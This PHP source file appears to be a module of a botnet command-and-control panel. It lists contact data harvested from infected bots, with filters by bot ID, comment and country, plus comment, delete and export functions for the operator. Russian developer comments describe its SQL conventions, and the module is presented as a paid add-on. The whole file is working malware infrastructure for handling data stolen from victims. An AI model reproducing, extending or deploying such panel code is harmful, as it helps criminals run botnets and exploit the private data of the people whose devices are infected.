<?php
require_once "cmd_mod.php";

class contacts extends modBase
{
	protected $module_name = 'contacts';

	function get_filter()
	{
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID', modBase::$filters['bot_id']),
			array('bot_comment', 'Bot comment', 'Bot comment'),
			array('country', 'Country code', 'DE'),
		);
		
		// bot id, bot comment, country list, CC number/bin, only online bots
		return $this->build_filter($fields);
	}
	
	function get_comment_cell($contact_id, $comment)
	{
		$uniq_id = 'contact';
		
		$hide_field = $html = '';
		if(trim($comment))
		{
			$hide_link = 'display: none;';
			$hide_field = '';
		}else{
			$hide_link = '';
			$hide_field = 'display: none;';
		}
		
		$html .= <<<PHP
	<center id='addlink-{$contact_id}' style='{$hide_link}'><a style='font-size: 12pt; text-decoration: none; border-bottom: 1px dotted #1abc9c' href="javascript:show_comment_area('addlink-{$contact_id}', '{$uniq_id}-{$contact_id}'); undefined">Add</a></center>

	<textarea rows='1' class='form-control' cols='10' id="{$uniq_id}-{$contact_id}" style='{$hide_field}' onkeypress="show_save_button(this)" onkeydown="show_save_button(this)">{$comment}</textarea>
	<button id='button-{$uniq_id}-{$contact_id}' style='width: 100%; display: none' type='button' class='btn btn-info' onclick="save_comment('{$contact_id}', '{$uniq_id}')"><i class="fa fa-save" title=""></i></button>
PHP;
		return $html;
	}

	function get_content()
	{
		$content = "<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<i class='fa fa-address-book marginRight10'></i>
				Contacts</div>
		</div>
		<div>&nbsp;</div>";
		
		if($this->client_cfg['mod_contacts'] == 0)
		{
			$content .= "<div><center>This is paid module.<br /> Contact support to activate it. Also, you can know more in <a href='#page:menu-extras' style='color: yellow'>Extras</a>.</center></div>";
			return $this->wrap_content("", $content);
		}
		
		$bot_id = hlp::get($this->filter_values, 'bot_id', '');
		$bot_comment = hlp::get($this->filter_values, 'bot_comment', '');
		$country_code = hlp::get($this->filter_values, 'country', '');

		// сперва составляешь список полей:
		// $fields = 'bot_contacts.id, data, bot_contacts.comment, bots.bot_id'
		
		// потом пишешь sql с макросом %FIELDS%
		
		// потом применяешь его, вставляя поля или count() так:
		// str_replace('%FIELDS%', 'count(bot_banks.id)', $sql)
		
		$sql = "select bot_contacts.id, data, bot_contacts.comment, bot_contacts.bot_id from bot_contacts, bots where bots.bot_id = bot_contacts.bot_id";
		$sql_count = "select count(bot_contacts.id) from bot_contacts, bots where bots.bot_id = bot_contacts.bot_id";

		if ($bot_id){ 
			$sql .= " and bot_contacts.bot_id = (select id from bots where bot_contacts.bot_id = {$this->db->quote($bot_id)})";
			// смысл addWhere, чтобы ты никогда не писал в модулях слова WHERE и AND - он сам их проверяет и ставит где надо
			// поэтому должно быть так:
			// $sql = $this->addWhere($sql, "bot_contacts.bot_id = (select id from bots where bot_id = {$this->db->quote($bot_id)})");
		
			// тут тоже:
			$sql_count .= " and bot_contacts.bot_id = (select id from bots where bot_contacts.bot_id = {$this->db->quote($bot_id)})";
		}

		if ($bot_comment){
			$sql .= " and bots.comment = {$this->db->quote($bot_comment)}"; 
			$sql_count .= " and bots.comment = {$this->db->quote($bot_comment)}";
		}
		
		if($country_code)
		{
			$country_code = $this->db->quote(strtolower($country_code));
			$sql = $this->addWhere($sql, "bots.country = {$country_code}");
			#echo $sql;
		}

	// вот тут $sql_count меняешь на str_replace('%FIELDS%', 'count(tablename.id)', $sql)
	
		$total_rows = $this->db->exec($sql_count, null, true)[0][0];
		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];


		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;contacts-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Bot ID';
		$headers[] = 'Contacts';
		$headers[] = "Comment";
		$headers[] = "Action";

// и тут str_replace
		$data = $this->db->exec($sql, null, true);

		$rows = array();
		
		foreach ($data as $row) {
			$tmp = array();
			$tmp[] = "<label class='checkbox' for='contacts-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='contacts-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = "<a onmouseout='hide_bot_details()' onmouseover='show_bot_details(this, \"{$row['bot_id']}\")' href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
			
			$data = "<textarea rows='5' class='form-control' cols='10'>";

			$json = json_decode($row['data'], true);

			if($json)
			foreach($json as $key=>$val)
				$data .= "{$key}: {$val}\n";

			$data .= "</textarea>";

			$tmp[] = $data;

			$tmp[] = $this->get_comment_cell($row['id'], $row['comment']);
			$tmp[] = "<button type='button' class='btn btn-danger' onclick='show_ajax_form(\"panel_delete_contacts\", [{$row['id']}])'>Delete</button>";
			$rows[] = $tmp;

		}

		$content .= $this->get_table($rows, $headers, 'textcenter');
		
		$buttons = array(
			array('Export', 'Export all selected items', 'export_txt_csv("contacts")', 'info'),
			array('Delete', 'Delete all selected items', 'show_ajax_form("panel_delete_contacts")', 'danger'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
}
